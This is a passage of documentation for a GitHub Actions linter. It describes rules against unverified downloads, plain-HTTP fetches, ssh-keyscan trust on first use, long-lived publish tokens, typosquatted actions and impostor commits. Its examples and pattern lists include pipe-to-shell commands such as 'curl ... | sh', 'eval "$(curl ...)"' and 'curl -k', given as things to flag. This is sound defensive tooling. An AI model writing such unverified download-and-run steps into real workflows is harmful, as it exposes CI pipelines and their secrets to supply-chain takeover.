    runs-on: ubuntu-latest
    steps:
      - shell: bash
        run: curl -fsSL https://example.com/install.sh | sh
      - run: |
          curl -fsSLo tool https://example.com/dl/tool
          chmod +x tool
          ./tool --version
```

Output:

```
test.yaml:7:14: the script downloaded from "https://example.com/install.sh" is run by "sh" without being verified, so whoever controls that server or the connection to it controls this job. if it installs a tool, mise can install it and record its checksum in mise.lock (jdx/mise-action in CI). otherwise check the checksum or signature (sha256sum -c, gpg --verify, cosign verify-blob or gh attestation verify) before running the file [unverified-download]
  |
7 |         run: curl -fsSL https://example.com/install.sh | sh
  |              ^~~~
test.yaml:9:11: the file "tool" downloaded from "https://example.com/dl/tool" is made executable without a checksum or signature check in this script, so whatever the server (or anyone on the connection) sends is trusted. if it installs a tool, mise can install it and record its checksum in mise.lock (jdx/mise-action in CI). otherwise check the checksum or signature (sha256sum -c, gpg --verify, cosign verify-blob or gh attestation verify) before running the file [unverified-download]
  |
9 |           curl -fsSLo tool https://example.com/dl/tool
  |           ^~~~
```

[Playground](https://jactionlint.jdx.dev/#eNpsjDEOgzAMRXdO8fcqZM8ZuvUEAVKFysQRtisGDl8BFUJVN8v/vccloJrk5sWdhAaQpFa3A5itiNsA66yoOYqaRPdJNFU5KMBBciIK6KLk72+3A3qbCe4pjzuyapXgfVriVCm1PU9+LKKRqJWMFafrDnc9U7h0GMpMf2sD+W27anniAbcFP/92B+HcO80ycvkMAGLeTWk=)

**What is reported.**

- a download piped into a shell or an interpreter: `curl ... | sh`, `wget -qO- ... | sudo bash`, `bash <(curl ...)`, `sh -c "$(curl ...)"`, `eval "$(curl ...)"` and `curl ... | python3 -`;
- a downloaded file that the same script makes executable (`chmod +x`, `install -m 755`), runs, sources or installs with `dpkg`, `rpm` or `apt`, when no checksum or signature check (`sha256sum`, `shasum`, `gpg --verify`, `cosign verify-blob`, `gh attestation verify`, `minisign`, ...) comes before the use. A file that is moved with `mv`, `cp` or `install` is followed;
- a download made with TLS certificate verification turned off (`curl -k`, `curl --insecure`, `wget --no-check-certificate`).

**What is not reported.**

- a pipe into something that only reads the data (`curl ... | tar xz`, `| jq`, `| python3 -c '...'`);
- a URL for a full commit on GitHub, GitLab, Codeberg or Bitbucket (`https://raw.githubusercontent.com/<owner>/<repo>/<40 hex digits>/install.sh`), because the URL fixes the content;
- a file of this repository at the commit that runs the workflow (`https://github.com/${GITHUB_REPOSITORY}/raw/${GITHUB_SHA}/tools/release.sh`, or with `${{ github.repository }}` and `${{ github.sha }}`), because the repository checked it in itself;
- a host that is not on the internet (`localhost`, a private address);
- a script whose shell is not `bash` or `sh`: the default shell of Windows runners is `pwsh`, which is not analyzed;
- an archive that is extracted and then run, `npx` or `go install` of a remote script, and a verification that happens in a later step. These are not tracked.

**Fix.** If the download installs a tool, install the tool with [mise](https://mise.jdx.dev) instead: use `jdx/mise-action` pinned by SHA, or `mise use` with a committed `mise.lock`, which records the version and the checksum of each tool. Otherwise download the installer to a file, check its checksum or signature and run the file, or use the package of the vendor. There is no automatic fix, because whether a download is acceptable is a decision of its author.

**Configure.** To accept a download, list the host or a URL prefix in `allow` (an entry with `://` is a prefix of the URL, anything else is a host name), or [ignore one finding](./ignore.md#ignore-some-errors) with `# jactionlint ignore=unverified-download`:

```yaml
rules:
  unverified-download:
    allow: [get.example.com, "https://example.org/install/"]
```

**Related.** zizmor has no audit for this rule; see [zizmor parity](./zizmor-parity.md).

<a id="check-insecure-url-scheme"></a>
## Insecure URL schemes

The rule `insecure-url-scheme` (in the `default` profile) reports a location that a script or an action input fetches over `http://`, `ftp://` or `git://`. These schemes send the request and the answer in the clear and do not prove who the server is, so anyone on the path can read or replace what the job downloads.

Example input:

```yaml
on: push
jobs:
  setup:
    runs-on: ubuntu-latest
    steps:
      - run: curl -fsSL http://example.com/data.json -o data.json
      - uses: octo/repo@v1
        with:
          mirror: http://mirror.example.com/downloads
```

Output:

```
test.yaml:6:25: "http://example.com/data.json" is fetched by "curl" without encryption or authentication of the server, so anyone on the connection can read or replace what is transferred. use "https://example.com/data.json" [insecure-url-scheme]
  |
6 |       - run: curl -fsSL http://example.com/data.json -o data.json
  |                         ^~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:9:19: the input "mirror" is "http://mirror.example.com/downloads", which is fetched without encryption or authentication of the server, so anyone on the connection can read or replace what is transferred. use "https://mirror.example.com/downloads" [insecure-url-scheme]
  |
9 |           mirror: http://mirror.example.com/downloads
  |                   ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNpUjUGOgzAMRfec4l8gRLP1ag4wuzlBAFeAQhzFdunxK0qL1J2f/pOfFEJ1nbtVBqUOUDavxwE0LxoOwQcv5iEnY7XXpMZVTwsIh0kYvWWEm/7/YTarFCM/0lYz96NscUqW+lWlIAguuD64shJkNImNq/zef94TsC8200XAtrQmjT6RE/uvluwlS5r0OQDNkEUr)

**What is reported.**

- the URLs given to `curl`, `wget`, `git` (`clone`, `fetch`, `pull`, `push`, `remote`, `submodule`, `ls-remote`), `pip`, `pipx`, `uv`, `uvx`, `poetry`, `npm`, `pnpm`, `yarn`, `bun`, `aube` (and `aubx`), `cargo`, `gem`, `go` and a few other download commands in `run:` scripts, including the values of options such as `--index-url` and `--registry`;
- inputs of actions in `with:` whose whole value is such a URL.

**Fix.** The message names the same URL with `https://`. Use it. There is no automatic fix, because the host may not serve the same content over HTTPS.

**What is not reported.**

- hosts that are not on the internet: `localhost`, loopback, private and link-local addresses, names without a dot (the services of a job), and `.local`, `.internal`, `.svc`, `.lan` and `.test` names;
- a host that is a variable or an expression, proxies (`curl -x`), headers, request data and text printed by `echo`;
- an input whose name contains `timestamp` (`timestamp-rfc3161`): the address of an RFC 3161 timestamp authority is `http` by design, because what it returns is signed.

**Configure.** Turn the rule off with `insecure-url-scheme: off` in `rules`, or [ignore one finding](./ignore.md#ignore-some-errors) with `# jactionlint ignore=insecure-url-scheme`.

**Related.** zizmor has an audit with the same name that checks the `repo:` URLs of pre-commit configurations, which this rule does not cover; see [zizmor parity](./zizmor-parity.md).

<a id="check-insecure-ssh-keyscan"></a>
## Host keys collected with ssh-keyscan

The rule `insecure-ssh-keyscan` (in the `default` profile) reports `ssh-keyscan` output that a `run:` script writes to a `known_hosts` file: `>>` and `>` redirections, `tee`, a command substitution and a group. `ssh-keyscan` asks the server for its key and trusts the answer (trust on first use), so anyone who can intercept the connection of the runner becomes the server for every later `ssh`, `scp` and `rsync` of the job.

Example input:

```yaml
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ssh-keyscan deploy.example.com >> ~/.ssh/known_hosts
```

Output:

```
test.yaml:6:14: "ssh-keyscan" writes the host key it receives to "~/.ssh/known_hosts", so the key of whoever answers the connection is trusted (trust on first use), and an attacker on the path to the server can take it over for every later ssh, scp or rsync. store the verified host key in a secret or variable and write that to the known_hosts file instead [insecure-ssh-keyscan]
  |
6 |       - run: ssh-keyscan deploy.example.com >> ~/.ssh/known_hosts
  |              ^~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNoszDEOwjAQRNE+p5gL2Old5CrICStZxNm1GK8gDWdHhnQjzdM3TWjOMj1sZZqAu7Rq51jA05VhCF9du4eau7D/LnZp/CsgDJlAlrDLyS3rlYnyzkerEjc7sCz4zJEs86720lsxdn4HAD7eKjU=)

**Fix.** Keep the verified host key in a repository variable or secret and write that to the file instead:

```yaml
- run: echo "${{ secrets.KNOWN_HOSTS }}" >> ~/.ssh/known_hosts
```

Under the `pedantic` profile, [`template-injection`](#untrusted-inputs) also reports the expansion of a secret in the text of a script. To avoid that finding, pass the secret through `env:` (`KNOWN_HOSTS: ${{ secrets.KNOWN_HOSTS }}`) and write `"$KNOWN_HOSTS"` instead. There is no automatic fix.

**What is not reported.** A script that shows the fingerprints with `ssh-keygen -l`, to compare them with known ones. The rule does not look at `ssh -o StrictHostKeyChecking=no`.

**Configure.** Turn the rule off with `insecure-ssh-keyscan: off` in `rules`, or [ignore one finding](./ignore.md#ignore-some-errors) with `# jactionlint ignore=insecure-ssh-keyscan`.

**Related.** zizmor has no audit for this rule; see [zizmor parity](./zizmor-parity.md).

<a id="check-use-trusted-publishing"></a>
## Publishing with long-lived credentials

The rule `use-trusted-publishing` (in the `default` profile) reports a package that is published with a long-lived credential although the registry supports trusted publishing. PyPI, crates.io, RubyGems, npm and NuGet support [trusted publishing](https://docs.pypi.org/trusted-publishers/): the registry trusts the OIDC token that GitHub issues for the workflow run, so no API token has to be stored as a secret, and a stolen token cannot publish.

Example input:

```yaml
on:
  release:
    types: [published]
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - run: twine upload dist/*
        env:
          TWINE_PASSWORD: ${{ secrets.PYPI_TOKEN }}
      - uses: pypa/gh-action-pypi-publish@76f52bc884231f62b9a034ebfe128415bbaabdfc # v1.12.4
        with:
          password: ${{ secrets.PYPI_TOKEN }}
```

Output:

```
test.yaml:8:14: "twine upload" publishes to PyPI with the long-lived credential TWINE_PASSWORD. prefer trusted publishing with pypa/gh-action-pypi-publish and the permission "id-token: write" [use-trusted-publishing]
  |
8 |       - run: twine upload dist/*
  |              ^~~~~~~~~~~~~~~~~~~
test.yaml:13:21: action "pypa/gh-action-pypi-publish@76f52bc884231f62b9a034ebfe128415bbaabdfc" publishes to PyPI but is given a password (input "password") instead of using trusted publishing. prefer trusted publishing with pypa/gh-action-pypi-publish and the permission "id-token: write" [use-trusted-publishing]
   |
13 |           password: ${{ secrets.PYPI_TOKEN }}
   |                     ^~~
```

[Playground](https://jactionlint.jdx.dev/#eNp8jsFKw0AQQO/9igE9CduaNK1xTwr2UIQ22EIRkbKbTMxK2F0ysw2h9N8lNgRP3mbmPZjnrJwANFijIuxHAO48koQPH3RtqMLic/LtNPVwOF29JlgSzkoIOlgOolaMxL+IGD1dLQDRmxK4NRYh+NqpAgpDPLsbBAC0JzkuAPvDerM6Zs+73WH79iLh9nwGwrxBpmn2nq2P++3ragOXy/ghUJ/sO69mX5VQORtnhe+8EUPy08OyXMQ6T9MknkflMtaP6n6eoC4xitMkWmitlC7KHG7gFE2jeJqMQa3h6m+eV0Sta4p/wn4GAGw+ZHU=)

**What is reported.**

- a `run:` script that publishes to the public registry: `twine upload`, `uv publish`, `poetry|flit|hatch|pdm publish`, `cargo publish`, `cargo mono publish`, `cargo workspaces publish`, `npm|pnpm|yarn|bun|aube publish`, `gem push`, `dotnet nuget push` and `nuget push`, also behind `sudo`, `uvx`, `uv tool run`, `pipx run`, `uv run`, `bundle exec` and `python -m`. The message names the long-lived credential when the step, its job or the workflow sets one of the usual environment variables (`TWINE_PASSWORD`, `NODE_AUTH_TOKEN`, `CARGO_REGISTRY_TOKEN`, `GEM_HOST_API_KEY`, ...). Scripts of `shell: pwsh` (the default shell of the Windows runners) and `powershell` are searched for the publish commands line by line;
- the actions `pypa/gh-action-pypi-publish` with `password`, `rubygems/configure-rubygems-credentials` with `api-token`, `rubygems/release-gem` with `setup-trusted-publisher: false` and `actions/setup-node` with an npm registry and `always-auth: true`.

**What is accepted.** A job that grants `id-token: write` (itself or through the workflow) is accepted, since it can use trusted publishing, and so are dry runs and publishing to a registry of your own (`--registry`, `--repository-url`). `id-token: write` does not silence the rule by itself, because jobs ask for it to sign in to a cloud provider or to publish with provenance: a publish command that is given a long-lived credential (an environment variable such as `NODE_AUTH_TOKEN` or `CARGO_REGISTRY_TOKEN`, or `--token`) is reported even when the job can request the OIDC token.

**Fix.** Configure the trusted publisher at the registry once, then use `pypa/gh-action-pypi-publish`, `rubygems/release-gem`, `rust-lang/crates-io-auth-action`, `NuGet/login` or `npm publish` with the permission `id-token: write`.

#### Credentials that are not long-lived

A credential variable that does not hold a long-lived credential is not one. `NODE_AUTH_TOKEN: ''` blanks the placeholder token that `actions/setup-node` writes, so that npm falls back to the OIDC token (the documented way to publish to npm with provenance). A variable set from the output of `rust-lang/crates-io-auth-action` or `NuGet/login` of the same job (for example `CARGO_REGISTRY_TOKEN: ${{ steps.auth.outputs.token }}`) holds a token that is valid for minutes. Both are trusted publishing, in a PowerShell script as well.

#### Publishes to a registry of your own

An npm publish to another registry than the public one is not reported, even when the command does not name the registry, in these cases:

- the script set the registry before (`npm config set registry URL`, `yarn config set npmRegistryServer URL`);
- the environment sets `npm_config_registry` or `YARN_NPM_REGISTRY_SERVER`;
- an earlier `actions/setup-node` step has a `registry-url` of another registry (GitHub Packages, `npm.pkg.github.com`, has no trusted publishing).

A registry that is written as a variable of the workflow (`registry-url: ${{ env.NPM_REGISTRY_URL }}`, `--registry ${{ env.REGISTRY }}`) is read from the `env:` of the step, the job or the workflow, when the value is written out there. Any other expression is taken for a registry of your own.

A registry that is set for one scope (`npm config set @acme:registry URL`) hides the publish only when the package is of that scope. The name is read from the `package.json` of the repository (in the `working-directory` of the step, or the folder that `npm publish` is given), and a package that is unscoped or of another scope is reported. A registry that is not scoped (`registry`) counts as private for every package. When the name cannot be known with confidence, the publish stays unreported: no `package.json` is readable, the directory is an expression or changed with `cd`, the command publishes a tarball or selects workspaces (`-w`, `--workspaces`, `--filter`), an earlier script of the job may have rewritten the manifest (`npm pkg set`, `jq` or `sed` on `package.json`), or the scope comes from the `scope` input of `actions/setup-node`.

**With the option `pedantic`** (on under the `pedantic` profile) the rule also looks at the jobs that **do** use trusted publishing. The OIDC token replaces a stored secret, but everything that runs in the job while it can request the token can use it to publish:

- **A job that builds and publishes.** The job publishes with the OIDC token, has an `actions/checkout` step and, before the publish, runs a build or an install of the dependencies (`pip install -r`, `npm ci`, `python -m build`, `uv build`, `make`, `cargo build`, a build action such as `PyO3/maturin-action` or `ruby/setup-ruby` with `bundler-cache`, ...). The code of the repository and of every dependency can publish a package. Build it in another job without `id-token: write`, upload the files as an artifact and publish from a job that only downloads and publishes them. Not reported: installing the tools of publishing (`pip install twine`, `npm install -g npm@latest`), jobs without a checkout, a build after the publish, and the publishes that build the package themselves and cannot be separated from the build (`cargo publish`, `rubygems/release-gem`).
- **A job without an `environment:`.** The trusted publisher of PyPI, npm, crates.io and RubyGems can be tied to an environment, and the environment can require an approval, so that a run that someone else started cannot publish on its own. Only the absence of the key is reported: whether the environment has protection rules is not in the file.
- **`attestations: false`** of `pypa/gh-action-pypi-publish` or `rubygems/release-gem`. Both publish attestations by default (PEP 740, sigstore), which let the users of the package check where and how it was built.

Example input:

```yaml
on:
  release:
    types: [published]
jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - run: python -m build
      - uses: pypa/gh-action-pypi-publish@76f52bc884231f62b9a034ebfe128415bbaabdfc # v1.12.4
        with:
          attestations: false
```

Example config:

```yaml
rules:
  use-trusted-publishing:
    pedantic: true
```

Output:

```
test.yaml:12:15: "pypa/gh-action-pypi-publish@76f52bc884231f62b9a034ebfe128415bbaabdfc" publishes to PyPI with the OIDC token of the job ("id-token: write"), and the job has no "environment:". tie the trusted publisher to an environment and add it to the job (with required reviewers if you can), so that a run that someone else started cannot publish on its own [use-trusted-publishing]
   |
12 |       - uses: pypa/gh-action-pypi-publish@76f52bc884231f62b9a034ebfe128415bbaabdfc # v1.12.4
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:12:15: "pypa/gh-action-pypi-publish@76f52bc884231f62b9a034ebfe128415bbaabdfc" publishes to PyPI with the OIDC token of the job ("id-token: write"), but the job also checks out the repository and runs "python -m build" before it, so that code and the code of its dependencies can use the token as well. build the package in another job without "id-token: write", pass it on as an artifact, and publish from a job that only downloads and publishes it [use-trusted-publishing]
   |
12 |       - uses: pypa/gh-action-pypi-publish@76f52bc884231f62b9a034ebfe128415bbaabdfc # v1.12.4
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:14:25: action "pypa/gh-action-pypi-publish@76f52bc884231f62b9a034ebfe128415bbaabdfc" is told not to publish attestations ("attestations: false"), although it does by default: they let the users of the package check where and how it was built. remove the input [use-trusted-publishing]
   |
14 |           attestations: false
   |                         ^~~~~
```

<!-- Skip playground link -->

This is the output with the option `pedantic`, set for the rule in [the config file](./config.md#rule-levels-and-options); the example config of this section is such an entry.

**Related.** zizmor has an audit of the same name; [zizmor parity](./zizmor-parity.md) lists the differences.

<a id="check-typosquat-uses"></a>
## Typosquatting of actions

The rule `typosquat-uses` (in the `default` profile) reports an action whose `owner/repo` is one typo away from a popular action of another owner, like `action/checkout` instead of `actions/checkout` or `dokcer/login-action` instead of `docker/login-action`. An attacker can register the misspelled account and serve malicious code to everyone who copied the typo.

Example input:

```yaml
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: action/checkout@v4
```

Example config:

```yaml
rules:
  typosquat-uses: warn
```

Output:

```
test.yaml:6:15: warning: "action/checkout" looks like a typo of the popular action "actions/checkout", which belongs to another account. a typosquatted account can serve malicious code. check the name; to accept it as is, add "action/checkout" to the "allow" option of the "typosquat-uses" rule [typosquat-uses]
  |
6 |       - uses: action/checkout@v4
  |               ^~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The output shows the rule at the level `warn`, which this `rules` section of [the config file](./config.md#rule-levels-and-options) sets. The default level is `error`.

**What is reported.** One typo means a character added, removed, replaced or two neighboring characters swapped. The popular actions are the ones in the data set behind [the popular action inputs check](#check-popular-action-inputs). The check compares names only: it does not ask GitHub whether the repository exists.

**What is not reported.** A near miss in the repository name under the right owner (`actions/chekout`): nobody else can create it, and it fails to resolve. An action that is itself in the data set is never reported.

**Fix.** Check the name. If it is intentional (a fork or a renamed action), add its `owner/repo` to the option `allow`:

```yaml
rules:
  typosquat-uses:
    level: warn
    allow: [acttons/setup-node]
```

There is no automatic fix, because jactionlint cannot be sure which name was meant.

<a id="check-forbidden-uses"></a>
## Forbidden actions (opt-in)

The rule `forbidden-uses` restricts which actions and reusable workflows a repository may use. It is an opt-in rule, which belongs to no profile: it does nothing unless the `allow` or the `deny` option is set. With `allow`, only the matching ones are accepted. With `deny`, the matching ones are rejected. It is the inverse of [`required-actions`](./config.md#required-actions), which demands that some action is used.

Example input:

```yaml
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: tj-actions/changed-files@v45
```

Example config:

```yaml
rules:
  forbidden-uses:
    allow:
      - actions/*
      - github/codeql-action/*
```

Output:

```
test.yaml:7:15: action "tj-actions/changed-files@v45" is not allowed because it matches no pattern in the "allow" list of the "forbidden-uses" rule ("actions/*", "github/codeql-action/*"). use an allowed one or add a pattern to the configuration [forbidden-uses]
  |
7 |       - uses: tj-actions/changed-files@v45
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The output keeps only the findings of this rule (`--select forbidden-uses` does the same for a copy of the example). It comes from the `rules` section of the example config, which is an entry of [the config file](./config.md#rule-levels-and-options), which makes the rule run.

**Patterns.** Both options are lists of patterns. A pattern is `owner/repo[/path]`, optionally followed by `@ref`; names are case-insensitive and refs are case-sensitive:

| Pattern | Matches |
| --- | --- |
| `*` | every action and reusable workflow |
| `actions/*` | every action of the owner, including those in sub-directories |
| `github/codeql-action/*` | the repository and everything in it, such as `github/codeql-action/init` |
| `actions/cache` | only the root of the repository: not `actions/cache/save` |
| `actions/cache/save` | only that sub-directory |
| `octo-org/shared/.github/workflows/ci.yaml@v1` | only that workflow at that ref |
| `octo-org/*@v1` | anything of the owner at `v1` |
| `actions/setup-*` | any other `*` matches any characters |

`allow` and `deny` never report local actions (`./path`, `$/path`) and Docker images (`docker://`), and neither do they report values that contain an expression. A deny pattern wins over an allow pattern. When both lists are set, a reference must match `allow` and must not match `deny`.

```yaml
rules:
  forbidden-uses:
    deny:
      - tj-actions/changed-files
```

**Images.** The options `images-allow` and `images-deny` do the same for container images: the image of `container:` and `services:`, of `uses: docker://`, of the `runs.image: docker://` of a Docker action, and of `docker run`, `docker create` and `docker pull` in a script (see [unpinned container images](#check-unpinned-images) for what is read). A pattern is a glob of the image name where `*` matches any characters, `/` included. The registry of Docker Hub can be left out (`node` is `docker.io/library/node`), and a pattern with a tag (`node:20`) matches that tag only. Images written with an expression are not judged.

```yaml
rules:
  forbidden-uses:
    images-allow:
      - ghcr.io/my-org/*
      - mirror.example.com/*
    images-deny:
      - "*:latest"
```

The rule is for policy, so its default level is `error`. There is no automatic fix.

<a id="check-impostor-commit"></a>
## Impostor commits (online)

The rule `impostor-commit` reports an action or reusable workflow that is pinned to a commit which is not part of the history of its repository, because the commit exists only in a fork or in an unmerged pull request. It is an online rule: it runs only with `--online` (or `online: true` in [the config file](./config.md#online-options)), see [online checks](./online.md#online-checks). The playground does not run online rules, so the examples of the online checks have no playground link, and the first comment line of such an example, `# requires --online`, only states that requirement.

GitHub stores a repository and all its forks as one network of commits. A commit that exists only in a fork can therefore be written as `owner/repo@<sha>` of the parent repository, and a workflow pinned this way looks as safe as any other hash-pinned action while it runs code that was never part of the repository.

Example input:

```yaml
# requires --online
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # OK: the commit is tagged v4.2.2
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      # ERROR: the commit is only in a pull request from a fork
      - uses: actions/checkout@2f547d07f23dec7f4a96fc091165260dcbe59529
```

Output:

```
test.yaml:10:15: action "actions/checkout@2f547d07f23dec7f4a96fc091165260dcbe59529" is pinned to commit 2f547d07f23d, which is on no branch or tag of actions/checkout. it can come from a fork of the repository, where anyone can create a commit that looks like part of it (an impostor commit). pin a commit from the history of actions/checkout instead [impostor-commit]
   |
10 |       - uses: actions/checkout@2f547d07f23dec7f4a96fc091165260dcbe59529
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:10:15: info: action "actions/checkout@2f547d07f23dec7f4a96fc091165260dcbe59529" is pinned to commit 2f547d07f23d, which no tag of actions/checkout points to. the commit may contain changes that no release documents. pin the commit of a tagged release instead [stale-action-refs]
   |
10 |       - uses: actions/checkout@2f547d07f23dec7f4a96fc091165260dcbe59529
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

**What is accepted.** A commit is accepted when a tag of the repository points to it, or when it is an ancestor of the head of the default branch or of one of the other branches. A commit that is in the history of a tag only (for example of a deleted release branch) is reported. The option `max-branches` (default `1000`) bounds how many branches are compared. With a token the branches are compared 100 at a time in one GraphQL request; without one, each branch costs a request and at most 100 are compared. When the repository has more branches than are compared and none of them has the commit, the rule says nothing: it reports only what it could verify.

**Fix.** Pin a commit of the action's own history, preferably the one of a release tag. The commit of the example is also reported by [`stale-action-refs`](#check-stale-action-refs), because no tag points to it.

**Configure.** To accept a finding, ignore it by rule ID (`jactionlint --ignore impostor-commit`) or lower its level in [the config file](./config.md#rule-levels-and-options).

**Related.** The audit of the same name in zizmor is [`impostor-commit`](https://docs.zizmor.sh/audits/#impostor-commit); [zizmor parity](./zizmor-parity.md) compares the two.

<a id="check-known-vulnerable-actions"></a>
## Known vulnerable actions (online)

The rule `known-vulnerable-actions` reports an action or reusable workflow whose version is covered by a GitHub security advisory, such as the leak of secrets through `tj-actions/changed-files`. It reads the advisories of the GitHub Actions ecosystem, works out which version the workflow runs, and reports it when an advisory covers that version. It is an online rule: it runs only with `--online`, see [online checks](./online.md#online-checks).

**Where the advisories come from.** The rule reads the list of all advisories of the actions ecosystem with one request for the whole run, which also names no repository of yours to GitHub. If that list cannot be read (the endpoint answers an error, or the list is longer than the pages jactionlint reads), the rule asks about each action instead, and the findings are the same. The data is always live (or the cache of the last live answer, see [online checks](./online.md#online-checks)), never a copy shipped with jactionlint.

**Which version is checked.** The version comes from the ref: a version tag such as `v45.0.2` is the version. For `v45`, or a commit SHA, the rule takes the most specific version tag on the same commit. A branch has no version and is never reported. The finding names the first patched version when there is one.

Example input:

```yaml
# requires --online
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: v45 is version 45.0.2, which an advisory covers
      - uses: tj-actions/changed-files@v45
      # OK: 46.0.1 contains the fix
      - uses: tj-actions/changed-files@2f7c5bfce28377bc069a65ba478de0a74aa0ca32 # v46.0.1
```

Output:

```
test.yaml:8:15: action "tj-actions/changed-files@v45" (version 45.0.2) is affected by GHSA-mrrh-fwg8-r2c3 (high severity, https://github.com/advisories/GHSA-mrrh-fwg8-r2c3): tj-actions changed-files through 45.0.7 allows remote attackers to discover secrets by reading actions logs. upgrade to 46.0.1 or later. to accept the risk add "GHSA-mrrh-fwg8-r2c3" to the "allow" option of this rule [known-vulnerable-actions]
  |
8 |       - uses: tj-actions/changed-files@v45
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

**Fix.** Upgrade to a patched version. Do not accept a finding unless you know the vulnerability does not apply to how you use the action.

**Configure.** The option `allow` lists the advisory IDs to ignore, and the level of the rule is set like any other:

```yaml
rules:
  known-vulnerable-actions:
    level: error
    allow:
      - GHSA-mrrh-fwg8-r2c3
```

**Related.** The audit of the same name in zizmor is [`known-vulnerable-actions`](https://docs.zizmor.sh/audits/#known-vulnerable-actions); [zizmor parity](./zizmor-parity.md) compares the two.

<a id="check-ref-confusion"></a>
## Ref confusion (online)

The rule `ref-confusion` reports an action whose ref is both a branch and a tag of its repository. `uses: owner/repo@v1` does not say whether `v1` is a branch or a tag, and when the repository has both, anyone who can push the second one can change what every workflow using the first runs, with no change to those workflows. It is an online rule: it runs only with `--online`, see [online checks](./online.md#online-checks).

Example input:

```yaml
# requires --online
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: v1 is a branch and a tag of this repository
      - uses: example/confusing@v1
      # OK: v2 is only a tag
      - uses: example/confusing@v2
```

Output:

```
test.yaml:8:15: warning: ref "v1" of action "example/confusing@v1" is both a branch and a tag of example/confusing, so it is ambiguous what runs and whoever controls the other ref can change it. pin the action to a full-length commit SHA [ref-confusion]
  |
8 |       - uses: example/confusing@v1
  |               ^~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The repository of the example is made up: the output comes from recorded answers of the GitHub API.

**Fix.** Pin the action to a full-length commit SHA.

**What is not reported.** A full-length commit SHA is never ambiguous and is not looked up. An abbreviated commit SHA (7 to 39 hexadecimal digits) is read as a name by GitHub, which prefers a branch or a tag of that name to the commit, so it is reported when the repository has one.

**Related.** The audit of the same name in zizmor is [`ref-confusion`](https://docs.zizmor.sh/audits/#ref-confusion); [zizmor parity](./zizmor-parity.md) compares the two.

<a id="check-stale-action-refs"></a>
## Stale action refs (online)

The rule `stale-action-refs` reports a hash-pinned action whose commit is not the commit of any tag. Such an action runs a snapshot between two releases. It may contain bugs, or fixes of vulnerabilities, which were never documented because changelogs describe releases. The rule is online and runs only with `--online`, see [online checks](./online.md#online-checks). Its level is `info`, because some repositories release from a rolling branch, where the finding does not apply.

Example input:

```yaml
# requires --online
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # OK: tagged v4.2.2
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      # INFO: no tag points to this commit
      - uses: actions/setup-node@3235b876344d2a9aa001b8d1453c930bba69e610
```

Output:

```
test.yaml:10:15: info: action "actions/setup-node@3235b876344d2a9aa001b8d1453c930bba69e610" is pinned to commit 3235b876344d, which no tag of actions/setup-node points to. the commit may contain changes that no release documents. pin the commit of a tagged release instead [stale-action-refs]
   |
10 |       - uses: actions/setup-node@3235b876344d2a9aa001b8d1453c930bba69e610
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The example uses recorded answers of the GitHub API, in which no tag points to the commit of `actions/setup-node`. A real run depends on the tags that the repository has.

**Fix.** Pin the commit of a tagged release instead.

**What is not reported.** When the repository has more tags than jactionlint reads (1000), the rule reports nothing for a commit it did not find.

**Related.** The audit of the same name in zizmor is [`stale-action-refs`](https://docs.zizmor.sh/audits/#stale-action-refs); [zizmor parity](./zizmor-parity.md) compares the two.

<a id="check-unpinnable-action"></a>
## Pins that do not hold (online)

The rule `unpinnable-action` reports an action that is pinned to a commit but whose own steps or image use a tag or a branch. Pinning an action to a commit SHA freezes the code of that action, and nothing else. A composite action which runs `uses: actions/cache@v4` or a Docker action which runs `docker://alpine:3` pulls in a tag, which its owner, or whoever takes the account over, can move, so the pin of the workflow does not stop what runs from changing. The rule reads the `action.yml` of every action pinned to a commit, with `--online`, see [online checks](./online.md#online-checks).

It runs only with the option `pedantic` (on under `profile: pedantic`, or `rules: {unpinnable-action: {pedantic: true}}`), because it reads every pinned action, also the popular ones, and the finding is about someone else's code.

Example input:

```yaml
# requires --online
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: this composite action runs actions/cache@v4
      - uses: pre-commit/action@2c7b3805fd2a0fd8c1884dcaebf91fc102a13ecd # v3.0.1
      # ERROR: this Docker action runs an image tag
      - uses: actions/jekyll-build-pages@44a6e6beabd48582f863aeeb6cb2151cc1716697 # v1.0.13
      # OK: everything is pinned to a commit or a digest, also what it uses
      - uses: aquasecurity/trivy-action@57a97c7e7821a5776cebc9bb87c984fa69cba8f1 # v0.35.0
      - uses: reviewdog/action-actionlint@a8ac3eea598697a830f7d8e701fc9fcbfde88974 # v1.80.0
```

Output:

```
